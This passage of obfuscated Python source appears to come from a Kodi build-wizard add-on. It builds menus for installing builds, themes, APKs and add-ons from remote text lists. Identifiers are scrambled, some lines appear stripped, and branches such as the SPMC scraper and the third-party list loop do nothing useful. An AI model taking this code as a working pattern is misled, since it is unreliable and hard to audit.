		addDir ('כניסה לשמירת נתונים','savedata',icon =ICONSAVE ,themeit =THEME3 )#line:2184
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2185
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',icon =ICONBUILDS ,themeit =THEME3 )#line:2186
		addFile ('%s'%OO0000O0O0O0OO0O0 ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2187
	else :#line:2188
		O00OO00O0OOO00000 ,O000O0000OO00OO0O ,OO0000OO0OOOO0OO0 ,OO0OOO00O00000000 ,OO00000O00OO000OO ,O000OOO000OO0O0OO ,O0O000OOOO000000O =wiz .buildCount ()#line:2189
		OO00O00OOOO000O00 =False ;OOOOOOO0O0O0O00O0 =[]#line:2190
		if THIRDPARTY =='true':#line:2191
			if not THIRD1NAME ==''and not THIRD1URL =='':OO00O00OOOO000O00 =True ;OOOOOOO0O0O0O00O0 .append ('1')#line:2192
			if not THIRD2NAME ==''and not THIRD2URL =='':OO00O00OOOO000O00 =True ;OOOOOOO0O0O0O00O0 .append ('2')#line:2193
			if not THIRD3NAME ==''and not THIRD3URL =='':OO00O00OOOO000O00 =True ;OOOOOOO0O0O0O00O0 .append ('3')#line:2194
		OOOO00O0OOOOO0000 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"').replace ('adult=""','adult="no"')#line:2195
		O0OOO0OOO0O000O00 =re .compile ('name="(.+?)".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOO00O0OOOOO0000 )#line:2196
		if O00OO00O0OOO00000 ==1 and OO00O00OOOO000O00 ==False :#line:2197
			for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2198
				if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2199
				if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2200
				viewBuild (O0OOO0OOO0O000O00 [0 ][0 ])#line:2201
				return #line:2202
		addFile ('עדכון מהיר','fastupdate',icon =ICONSAVE ,themeit =THEME1 )#line:2205
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2206
		if OO00O00OOOO000O00 ==True :#line:2207
			for O0OO0O0O00OO0OOOO in OOOOOOO0O0O0O00O0 :#line:2208
				O0O00O0O0OO00OOO0 =eval ('THIRD%sNAME'%O0OO0O0O00OO0OOOO )#line:2209
		if len (O0OOO0OOO0O000O00 )>=1 :#line:2211
			if SEPERATE =='true':#line:2212
				for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2213
					if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2214
					if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2215
					OOO00O00O0000O00O =createMenu ('install','',O0O00O0O0OO00OOO0 )#line:2216
					addDir ('[%s] %s (v%s)'%(float (O0O0000OO00O0OO0O ),O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ),'viewbuild',O0O00O0O0OO00OOO0 ,description =O0OO000OO0O00OO0O ,fanart =OO00O0OOOO00OO0O0 ,icon =O0000OO0OOOOO00O0 ,menu =OOO00O00O0000O00O ,themeit =THEME2 )#line:2217
			else :#line:2218
				if OO0OOO00O00000000 >0 :#line:2219
					OOO00OO0O00OOO0OO ='+'if SHOW17 =='false'else '-'#line:2220
					if SHOW17 =='true':#line:2222
						for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2224
							if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2225
							if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2226
							O0OOO00OO0OOOO00O =int (float (O0O0000OO00O0OO0O ))#line:2227
							if O0OOO00OO0OOOO00O ==17 :#line:2228
								OOO00O00O0000O00O =createMenu ('install','',O0O00O0O0OO00OOO0 )#line:2229
								addDir ('[%s] %s (v%s)'%(float (O0O0000OO00O0OO0O ),O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ),'viewbuild',O0O00O0O0OO00OOO0 ,description =O0OO000OO0O00OO0O ,fanart =OO00O0OOOO00OO0O0 ,icon =O0000OO0OOOOO00O0 ,menu =OOO00O00O0000O00O ,themeit =THEME2 )#line:2230
				if OO00000O00OO000OO >0 :#line:2231
					OOO00OO0O00OOO0OO ='+'if SHOW18 =='false'else '-'#line:2232
					if SHOW18 =='true':#line:2234
						for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2236
							if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2237
							if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2238
							O0OOO00OO0OOOO00O =int (float (O0O0000OO00O0OO0O ))#line:2239
							if O0OOO00OO0OOOO00O ==18 :#line:2240
								OOO00O00O0000O00O =createMenu ('install','',O0O00O0O0OO00OOO0 )#line:2241
								addDir ('[%s] %s (v%s)'%(float (O0O0000OO00O0OO0O ),O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ),'viewbuild',O0O00O0O0OO00OOO0 ,description =O0OO000OO0O00OO0O ,fanart =OO00O0OOOO00OO0O0 ,icon =O0000OO0OOOOO00O0 ,menu =OOO00O00O0000O00O ,themeit =THEME2 )#line:2242
				if OO0000OO0OOOO0OO0 >0 :#line:2243
					OOO00OO0O00OOO0OO ='+'if SHOW16 =='false'else '-'#line:2244
					addFile ('[B]%s Jarvis Builds(%s)[/B]'%(OOO00OO0O00OOO0OO ,OO0000OO0OOOO0OO0 ),'togglesetting','show16',themeit =THEME3 )#line:2245
					if SHOW16 =='true':#line:2246
						for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2247
							if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2248
							if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2249
							O0OOO00OO0OOOO00O =int (float (O0O0000OO00O0OO0O ))#line:2250
							if O0OOO00OO0OOOO00O ==16 :#line:2251
								OOO00O00O0000O00O =createMenu ('install','',O0O00O0O0OO00OOO0 )#line:2252
								addDir ('[%s] %s (v%s)'%(float (O0O0000OO00O0OO0O ),O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ),'viewbuild',O0O00O0O0OO00OOO0 ,description =O0OO000OO0O00OO0O ,fanart =OO00O0OOOO00OO0O0 ,icon =O0000OO0OOOOO00O0 ,menu =OOO00O00O0000O00O ,themeit =THEME2 )#line:2253
				if O000O0000OO00OO0O >0 :#line:2254
					OOO00OO0O00OOO0OO ='+'if SHOW15 =='false'else '-'#line:2255
					addFile ('[B]%s Isengard and Below Builds(%s)[/B]'%(OOO00OO0O00OOO0OO ,O000O0000OO00OO0O ),'togglesetting','show15',themeit =THEME3 )#line:2256
					if SHOW15 =='true':#line:2257
						for O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ,O0O00O000O0O0O00O ,O0000OOOOO00O000O ,O0O0000OO00O0OO0O ,O0O0OOO000O000OO0 ,O0000OO0OOOOO00O0 ,OO00O0OOOO00OO0O0 ,O0O0000000OOOOOOO ,O0OO000OO0O00OO0O in O0OOO0OOO0O000O00 :#line:2258
							if not SHOWADULT =='true'and O0O0000000OOOOOOO .lower ()=='yes':continue #line:2259
							if not DEVELOPER =='true'and wiz .strTest (O0O00O0O0OO00OOO0 ):continue #line:2260
							O0OOO00OO0OOOO00O =int (float (O0O0000OO00O0OO0O ))#line:2261
							if O0OOO00OO0OOOO00O <=15 :#line:2262
								OOO00O00O0000O00O =createMenu ('install','',O0O00O0O0OO00OOO0 )#line:2263
								addDir ('[%s] %s (v%s)'%(float (O0O0000OO00O0OO0O ),O0O00O0O0OO00OOO0 ,O0OO00O00O000OO00 ),'viewbuild',O0O00O0O0OO00OOO0 ,description =O0OO000OO0O00OO0O ,fanart =OO00O0OOOO00OO0O0 ,icon =O0000OO0OOOOO00O0 ,menu =OOO00O00O0000O00O ,themeit =THEME2 )#line:2264
		elif O0O000OOOO000000O >0 :#line:2265
			if O000OOO000OO0O0OO >0 :#line:2266
				addFile ('There is currently only Adult builds','',icon =ICONBUILDS ,themeit =THEME3 )#line:2267
				addFile ('Enable Show Adults in Addon Settings > Misc','',icon =ICONBUILDS ,themeit =THEME3 )#line:2268
			else :#line:2269
				addFile ('Currently No Builds Offered from %s'%ADDONTITLE ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2270
		else :addFile ('Text file for builds not formated correctly.','',icon =ICONBUILDS ,themeit =THEME3 )#line:2271
	setView ('files','viewType')#line:2272
def viewBuild (OOO0OOOOOO0OO0000 ):#line:2274
	O00O0O0O00O00OOOO =wiz .workingURL (SPEEDFILE )#line:2275
	if not O00O0O0O00O00OOOO ==True :#line:2276
		addFile ('בילדים לא זמינים אנא בדוק את חיבור האינטרנט','',themeit =THEME3 )#line:2277
		addFile ('%s'%O00O0O0O00O00OOOO ,'',themeit =THEME3 )#line:2278
		return #line:2279
	if wiz .checkBuild (OOO0OOOOOO0OO0000 ,'version')==False :#line:2280
		addFile ('Error reading the txt file.','',themeit =THEME3 )#line:2281
		addFile ('%s was not found in the builds list.'%OOO0OOOOOO0OO0000 ,'',themeit =THEME3 )#line:2282
		return #line:2283
	OO00O0O0O00O0O0O0 =wiz .openURL (SPEEDFILE ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('gui=""','gui="http://"').replace ('theme=""','theme="http://"')#line:2284
	O0OO00OO0OO0O0OO0 =re .compile ('name="%s".+?ersion="(.+?)".+?rl="(.+?)".+?ui="(.+?)".+?odi="(.+?)".+?heme="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?review="(.+?)".+?dult="(.+?)".+?escription="(.+?)"'%OOO0OOOOOO0OO0000 ).findall (OO00O0O0O00O0O0O0 )#line:2285
	for OOOOOOO0OOO0OOOOO ,O0O0000OO00O000O0 ,O00000O0000O0OOOO ,OOOOO0O0O0O0OO0O0 ,OO00000OO0000O0O0 ,O0O0O0OO0000OOO0O ,O00O00O0000O00000 ,O00O0O0OO00OO0000 ,OOO000O000O00O00O ,OO00O0O00O0OO00O0 in O0OO00OO0OO0O0OO0 :#line:2286
		O0O0O0OO0000OOO0O =O0O0O0OO0000OOO0O if wiz .workingURL (O0O0O0OO0000OOO0O )else ICON #line:2287
		O00O00O0000O00000 =O00O00O0000O00000 if wiz .workingURL (O00O00O0000O00000 )else FANART #line:2288
		OO0000OOOOOO0OO0O ='%s (v%s)'%(OOO0OOOOOO0OO0000 ,OOOOOOO0OOO0OOOOO )#line:2289
		if BUILDNAME ==OOO0OOOOOO0OO0000 and OOOOOOO0OOO0OOOOO >BUILDVERSION :#line:2290
			OO0000OOOOOO0OO0O ='%s [COLOR red][CURRENT v%s][/COLOR]'%(OO0000OOOOOO0OO0O ,BUILDVERSION )#line:2291
		O0OOO0OOO0OOO0OO0 =int (float (KODIV ));O0O00OOOOO0OO0OO0 =int (float (OOOOO0O0O0O0OO0O0 ))#line:2300
		if not O0OOO0OOO0OOO0OO0 ==O0O00OOOOO0OO0OO0 :#line:2301
			if O0OOO0OOO0OOO0OO0 ==16 and O0O00OOOOO0OO0OO0 <=15 :O00OO0OOO0O00O000 =False #line:2302
			else :O00OO0OOO0O00O000 =True #line:2303
		else :O00OO0OOO0O00O000 =False #line:2304
		addFile ('התקנה','install',OOO0OOOOOO0OO0000 ,'fresh',description =OO00O0O00O0OO00O0 ,fanart =O00O00O0000O00000 ,icon =O0O0O0OO0000OOO0O ,themeit =THEME1 )#line:2308
		if not OO00000OO0000O0O0 =='http://':#line:2311
			if wiz .workingURL (OO00000OO0000O0O0 )==True :#line:2312
				addFile (wiz .sep ('THEMES'),'',fanart =O00O00O0000O00000 ,icon =O0O0O0OO0000OOO0O ,themeit =THEME3 )#line:2313
				OO00O0O0O00O0O0O0 =wiz .openURL (OO00000OO0000O0O0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2314
				O0OO00OO0OO0O0OO0 =re .compile ('name="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OO00O0O0O00O0O0O0 )#line:2315
				for OO0OOOO00O0OOOO00 ,O0000O0OO0OOO0O00 ,O0O00O0OOOO00O00O ,OOOO00O0O00000O0O ,O00OO000OOOOOOOOO ,OO00O0O00O0OO00O0 in O0OO00OO0OO0O0OO0 :#line:2316
					if not SHOWADULT =='true'and O00OO000OOOOOOOOO .lower ()=='yes':continue #line:2317
					O0O00O0OOOO00O00O =O0O00O0OOOO00O00O if O0O00O0OOOO00O00O =='http://'else O0O0O0OO0000OOO0O #line:2318
					OOOO00O0O00000O0O =OOOO00O0O00000O0O if OOOO00O0O00000O0O =='http://'else O00O00O0000O00000 #line:2319
					addFile (OO0OOOO00O0OOOO00 if not OO0OOOO00O0OOOO00 ==BUILDTHEME else "[B]%s (Installed)[/B]"%OO0OOOO00O0OOOO00 ,'theme',OOO0OOOOOO0OO0000 ,OO0OOOO00O0OOOO00 ,description =OO00O0O00O0OO00O0 ,fanart =OOOO00O0O00000O0O ,icon =O0O00O0OOOO00O00O ,themeit =THEME3 )#line:2320
	setView ('files','viewType')#line:2321
def viewThirdList (O00OOO00O0O0O0O00 ):#line:2323
	O000OOO00O0000O0O =eval ('THIRD%sNAME'%O00OOO00O0O0O0O00 )#line:2324
	OOOO0OO0O00O0O00O =eval ('THIRD%sURL'%O00OOO00O0O0O0O00 )#line:2325
	OO0O00OOO00O0O0O0 =wiz .workingURL (OOOO0OO0O00O0O00O )#line:2326
	if not OO0O00OOO00O0O0O0 ==True :#line:2327
		addFile ('Url for txt file not valid','',icon =ICONBUILDS ,themeit =THEME3 )#line:2328
		addFile ('%s'%WORKINGURL ,'',icon =ICONBUILDS ,themeit =THEME3 )#line:2329
	else :#line:2330
		O00000OOOOO0OOOO0 ,O00O00O000O0O0OO0 =wiz .thirdParty (OOOO0OO0O00O0O00O )#line:2331
		addFile ("[B]%s[/B]"%O000OOO00O0000O0O ,'',themeit =THEME3 )#line:2332
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2333
		if O00000OOOOO0OOOO0 :#line:2334
			for O000OOO00O0000O0O ,O0OO0000000OO0000 ,OOOO0OO0O00O0O00O ,O0OO00OO00O0OO0O0 ,O0O0000O0O00OOOO0 ,O0000OOOO0O0O0OOO ,O000OO0OO00O0OO0O ,OOOOO0OO00OO000O0 in O00O00O000O0O0OO0 :#line:2335
				if not SHOWADULT =='true'and O000OO0OO00O0OO0O .lower ()=='yes':continue #line:2336
				addFile ("[%s] %s v%s"%(O0OO00OO00O0OO0O0 ,O000OOO00O0000O0O ,O0OO0000000OO0000 ),'installthird',O000OOO00O0000O0O ,OOOO0OO0O00O0O00O ,icon =O0O0000O0O00OOOO0 ,fanart =O0000OOOO0O0O0OOO ,description =OOOOO0OO00OO000O0 ,themeit =THEME2 )#line:2337
		else :#line:2338
			for O000OOO00O0000O0O ,OOOO0OO0O00O0O00O ,O0O0000O0O00OOOO0 ,O0000OOOO0O0O0OOO ,OOOOO0OO00OO000O0 in O00O00O000O0O0OO0 :#line:2339
				addFile (O000OOO00O0000O0O ,'installthird',O000OOO00O0000O0O ,OOOO0OO0O00O0O00O ,icon =O0O0000O0O00OOOO0 ,fanart =O0000OOOO0O0O0OOO ,description =OOOOO0OO00OO000O0 ,themeit =THEME2 )#line:2340
def editThirdParty (O0O0O0000O0O0OOO0 ):#line:2342
	OOO0O00000OO00OOO =eval ('THIRD%sNAME'%O0O0O0000O0O0OOO0 )#line:2343
	O00OOO0OO0O0O0OO0 =eval ('THIRD%sURL'%O0O0O0000O0O0OOO0 )#line:2344
	OOO000OO00000O000 =wiz .getKeyboard (OOO0O00000OO00OOO ,'Enter the Name of the Wizard')#line:2345
	O00OOO0O0OO00OOOO =wiz .getKeyboard (O00OOO0OO0O0O0OO0 ,'Enter the URL of the Wizard Text')#line:2346
	wiz .setS ('wizard%sname'%O0O0O0000O0O0OOO0 ,OOO000OO00000O000 )#line:2348
	wiz .setS ('wizard%surl'%O0O0O0000O0O0OOO0 ,O00OOO0O0OO00OOOO )#line:2349
def apkScraper (name =""):#line:2351
	if name =='kodi':#line:2352
		OOOOOO00000OO0OO0 ='http://mirrors.kodi.tv/releases/android/arm/'#line:2353
		OO000OO0OOO0O000O ='http://mirrors.kodi.tv/releases/android/arm/old/'#line:2354
		OO00OO00O000OO0O0 =wiz .openURL (OOOOOO00000OO0OO0 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2355
		O0O00000O0O0O0O00 =wiz .openURL (OO000OO0OOO0O000O ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2356
		O000OO0OOO0OOOOOO =0 #line:2357
		OOOOOOO0000O000OO =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (OO00OO00O000OO0O0 )#line:2358
		O0OO00OOOOOOOO0O0 =re .compile ('<tr><td><a href="(.+?)">(.+?)</a></td><td>(.+?)</td><td>(.+?)</td></tr>').findall (O0O00000O0O0O0O00 )#line:2359
		addFile ("Official Kodi Apk\'s",themeit =THEME1 )#line:2361
		O0O0OOOOO00O0000O =False #line:2362
		for O00O0OO0O000OO00O ,name ,O000000O00000OOOO ,O000O0OO000000OOO in OOOOOOO0000O000OO :#line:2363
			if O00O0OO0O000OO00O in ['../','old/']:continue #line:2364
			if not O00O0OO0O000OO00O .endswith ('.apk'):continue #line:2365
			if not O00O0OO0O000OO00O .find ('_')==-1 and O0O0OOOOO00O0000O ==True :continue #line:2366
			try :#line:2367
				O0O00000OOOO0OO00 =name .split ('-')#line:2368
				if not O00O0OO0O000OO00O .find ('_')==-1 :#line:2369
					O0O0OOOOO00O0000O =True #line:2370
					OOOO0OOO0OO00O0O0 ,O000OOO000OO0O00O =O0O00000OOOO0OO00 [2 ].split ('_')#line:2371
				else :#line:2372
					OOOO0OOO0OO00O0O0 =O0O00000OOOO0OO00 [2 ]#line:2373
					O000OOO000OO0O00O =''#line:2374
				O0OOO0O0O000OOO0O ="[COLOR %s]%s v%s%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00000OOOO0OO00 [0 ].title (),O0O00000OOOO0OO00 [1 ],O000OOO000OO0O00O .upper (),OOOO0OOO0OO00O0O0 ,COLOR2 ,O000000O00000OOOO .replace (' ',''),COLOR1 ,O000O0OO000000OOO )#line:2375
				OO0O0000O00OO000O =urljoin (OOOOOO00000OO0OO0 ,O00O0OO0O000OO00O )#line:2376
				addFile (O0OOO0O0O000OOO0O ,'apkinstall',"%s v%s%s %s"%(O0O00000OOOO0OO00 [0 ].title (),O0O00000OOOO0OO00 [1 ],O000OOO000OO0O00O .upper (),OOOO0OOO0OO00O0O0 ),OO0O0000O00OO000O )#line:2377
				O000OO0OOO0OOOOOO +=1 #line:2378
			except :#line:2379
				wiz .log ("Error on: %s"%name )#line:2380
		for O00O0OO0O000OO00O ,name ,O000000O00000OOOO ,O000O0OO000000OOO in O0OO00OOOOOOOO0O0 :#line:2382
			if O00O0OO0O000OO00O in ['../','old/']:continue #line:2383
			if not O00O0OO0O000OO00O .endswith ('.apk'):continue #line:2384
			if not O00O0OO0O000OO00O .find ('_')==-1 :continue #line:2385
			try :#line:2386
				O0O00000OOOO0OO00 =name .split ('-')#line:2387
				O0OOO0O0O000OOO0O ="[COLOR %s]%s v%s %s[/COLOR] [COLOR %s]%s[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR1 ,O0O00000OOOO0OO00 [0 ].title (),O0O00000OOOO0OO00 [1 ],O0O00000OOOO0OO00 [2 ],COLOR2 ,O000000O00000OOOO .replace (' ',''),COLOR1 ,O000O0OO000000OOO )#line:2388
				OO0O0000O00OO000O =urljoin (OO000OO0OOO0O000O ,O00O0OO0O000OO00O )#line:2389
				addFile (O0OOO0O0O000OOO0O ,'apkinstall',"%s v%s %s"%(O0O00000OOOO0OO00 [0 ].title (),O0O00000OOOO0OO00 [1 ],O0O00000OOOO0OO00 [2 ]),OO0O0000O00OO000O )#line:2390
				O000OO0OOO0OOOOOO +=1 #line:2391
			except :#line:2392
				wiz .log ("Error on: %s"%name )#line:2393
		if O000OO0OOO0OOOOOO ==0 :addFile ("Error Kodi Scraper Is Currently Down.")#line:2394
	elif name =='spmc':#line:2395
		O0OOOO0OO00OO0000 ='https://github.com/koying/SPMC/releases'#line:2396
		OO00OO00O000OO0O0 =wiz .openURL (O0OOOO0OO00OO0000 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2397
		O000OO0OOO0OOOOOO =0 #line:2398
		OOOOOOO0000O000OO =re .compile ('<div.+?lass="release-body.+?div class="release-header".+?a href=.+?>(.+?)</a>.+?ul class="release-downloads">(.+?)</ul>.+?/div>').findall (OO00OO00O000OO0O0 )#line:2399
		addFile ("Official SPMC Apk\'s",themeit =THEME1 )#line:2401
		for name ,O000O0O0OO0O000OO in OOOOOOO0000O000OO :#line:2403
			O0OOOO0O0O00O0OO0 =''#line:2404
			O0OO00OOOOOOOO0O0 =re .compile ('<li>.+?<a href="(.+?)" rel="nofollow">.+?<small class="text-gray float-right">(.+?)</small>.+?strong>(.+?)</strong>.+?</a>.+?</li>').findall (O000O0O0OO0O000OO )#line:2405
			for OO0OOOO0000O0O00O ,OOOOOO0O0O000O00O ,O0OOO0OOOO0O000O0 in O0OO00OOOOOOOO0O0 :#line:2406
				if O0OOO0OOOO0O000O0 .find ('armeabi')==-1 :continue #line:2407
				if O0OOO0OOOO0O000O0 .find ('launcher')>-1 :continue #line:2408
				O0OOOO0O0O00O0OO0 =urljoin ('https://github.com',OO0OOOO0000O0O00O )#line:2409
				break #line:2410
		if O000OO0OOO0OOOOOO ==0 :addFile ("Error SPMC Scraper Is Currently Down.")#line:2412
def apkMenu (url =None ):#line:2414
	if url ==None :#line:2415
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:2418
	if not APKFILE =='http://':#line:2419
		if url ==None :#line:2420
			OOO0O0O0OO0O0O000 =wiz .workingURL (APKFILE )#line:2421
			O000000000O0O0O00 =uservar .APKFILE #line:2422
		else :#line:2423
			OOO0O0O0OO0O0O000 =wiz .workingURL (url )#line:2424
			O000000000O0O0O00 =url #line:2425
		if OOO0O0O0OO0O0O000 ==True :#line:2426
			O0O0O0OO00O000O0O =wiz .openURL (O000000000O0O0O00 ).replace ('\n','').replace ('\r','').replace ('\t','')#line:2427
			OO000OOOOO0O000O0 =re .compile ('name="(.+?)".+?ection="(.+?)".+?rl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (O0O0O0OO00O000O0O )#line:2428
			if len (OO000OOOOO0O000O0 )>0 :#line:2429
				OO00OO0OOOOO00OO0 =0 #line:2430
				for O00OOOO0O0000O00O ,O0O0O0OOOOOO00O0O ,url ,OOOO0OO0O0OO0OOO0 ,OO0OOOO00O000OO00 ,O0O00OO0O00OOO00O ,OO00OOO000OO0000O in OO000OOOOO0O000O0 :#line:2431
					if not SHOWADULT =='true'and O0O00OO0O00OOO00O .lower ()=='yes':continue #line:2432
					if O0O0O0OOOOOO00O0O .lower ()=='yes':#line:2433
						OO00OO0OOOOO00OO0 +=1 #line:2434
						addDir ("[B]%s[/B]"%O00OOOO0O0000O00O ,'apk',url ,description =OO00OOO000OO0000O ,icon =OOOO0OO0O0OO0OOO0 ,fanart =OO0OOOO00O000OO00 ,themeit =THEME3 )#line:2435
					else :#line:2436
						OO00OO0OOOOO00OO0 +=1 #line:2437
						addFile (O00OOOO0O0000O00O ,'apkinstall',O00OOOO0O0000O00O ,url ,description =OO00OOO000OO0000O ,icon =OOOO0OO0O0OO0OOO0 ,fanart =OO0OOOO00O000OO00 ,themeit =THEME2 )#line:2438
					if OO00OO0OOOOO00OO0 <1 :#line:2439
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2440
			else :wiz .log ("[APK Menu] ERROR: Invalid Format.",xbmc .LOGERROR )#line:2441
		else :#line:2442
			wiz .log ("[APK Menu] ERROR: URL for apk list not working.",xbmc .LOGERROR )#line:2443
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2444
			addFile ('%s'%OOO0O0O0OO0O0O000 ,'',themeit =THEME3 )#line:2445
		return #line:2446
	else :wiz .log ("[APK Menu] No APK list added.")#line:2447
	setView ('files','viewType')#line:2448
def addonMenu (url =None ):#line:2450
	if not ADDONFILE =='http://':#line:2451
		if url ==None :#line:2452
			O0O00OOO0000O000O =wiz .workingURL (ADDONFILE )#line:2453
			O0O0O0000O00OOOOO =uservar .ADDONFILE #line:2454
		else :#line:2455
			O0O00OOO0000O000O =wiz .workingURL (url )#line:2456
			O0O0O0000O00OOOOO =url #line:2457
		if O0O00OOO0000O000O ==True :#line:2458
			OOOOO00000OO0O0O0 =wiz .openURL (O0O0O0000O00OOOOO ).replace ('\n','').replace ('\r','').replace ('\t','').replace ('repository=""','repository="none"').replace ('repositoryurl=""','repositoryurl="http://"').replace ('repositoryxml=""','repositoryxml="http://"')#line:2459
			O0O000000000O0000 =re .compile ('name="(.+?)".+?lugin="(.+?)".+?rl="(.+?)".+?epository="(.+?)".+?epositoryxml="(.+?)".+?epositoryurl="(.+?)".+?con="(.+?)".+?anart="(.+?)".+?dult="(.+?)".+?escription="(.+?)"').findall (OOOOO00000OO0O0O0 )#line:2460
			if len (O0O000000000O0000 )>0 :#line:2461
				O00OO0O0OOO0OO00O =0 #line:2462
				for OOO0O00OO0OOO0OO0 ,O0OOO0OO000OO0O00 ,url ,OO000O0OO000OOOO0 ,O0O0O0OO0OO0O00O0 ,OOO00OOO0O00000OO ,OOO00O0O0OO00OO00 ,O0O0OO0O000O00O00 ,OOO00OOOOO000OOOO ,O0OO00OO0O0O0OO0O in O0O000000000O0000 :#line:2463
					if O0OOO0OO000OO0O00 .lower ()=='section':#line:2464
						O00OO0O0OOO0OO00O +=1 #line:2465
						addDir ("[B]%s[/B]"%OOO0O00OO0OOO0OO0 ,'addons',url ,description =O0OO00OO0O0O0OO0O ,icon =OOO00O0O0OO00OO00 ,fanart =O0O0OO0O000O00O00 ,themeit =THEME3 )#line:2466
					else :#line:2467
						if not SHOWADULT =='true'and OOO00OOOOO000OOOO .lower ()=='yes':continue #line:2468
						try :#line:2469
							OO00OO0OO0OO0O00O =xbmcaddon .Addon (id =O0OOO0OO000OO0O00 ).getAddonInfo ('path')#line:2470
							if os .path .exists (OO00OO0OO0OO0O00O ):#line:2471
								OOO0O00OO0OOO0OO0 ="[COLOR green][Installed][/COLOR] %s"%OOO0O00OO0OOO0OO0 #line:2472
						except :#line:2473
							pass #line:2474
						O00OO0O0OOO0OO00O +=1 #line:2475
						addFile (OOO0O00OO0OOO0OO0 ,'addoninstall',O0OOO0OO000OO0O00 ,O0O0O0000O00OOOOO ,description =O0OO00OO0O0O0OO0O ,icon =OOO00O0O0OO00OO00 ,fanart =O0O0OO0O000O00O00 ,themeit =THEME2 )#line:2476
					if O00OO0O0OOO0OO00O <1 :#line:2477
						addFile ("No addons added to this menu yet!",'',themeit =THEME2 )#line:2478
			else :#line:2479
				addFile ('Text File not formated correctly!','',themeit =THEME3 )#line:2480
				wiz .log ("[Addon Menu] ERROR: Invalid Format.")#line:2481
		else :#line:2482
			wiz .log ("[Addon Menu] ERROR: URL for Addon list not working.")#line:2483
			addFile ('Url for txt file not valid','',themeit =THEME3 )#line:2484
			addFile ('%s'%O0O00OOO0000O000O ,'',themeit =THEME3 )#line:2485
	else :wiz .log ("[Addon Menu] No Addon list added.")#line:2486
	setView ('files','viewType')#line:2487
def addonInstaller (OO0OOOO000OOO000O ,O00O0000OO0O00O0O ):#line:2489
	if not ADDONFILE =='http://':#line:2490
		O000000O00O0O0OO0 =wiz .workingURL (O00O0000OO0O00O0O )#line:2491
		if O000000O00O0O0OO0 ==True :#line:2492
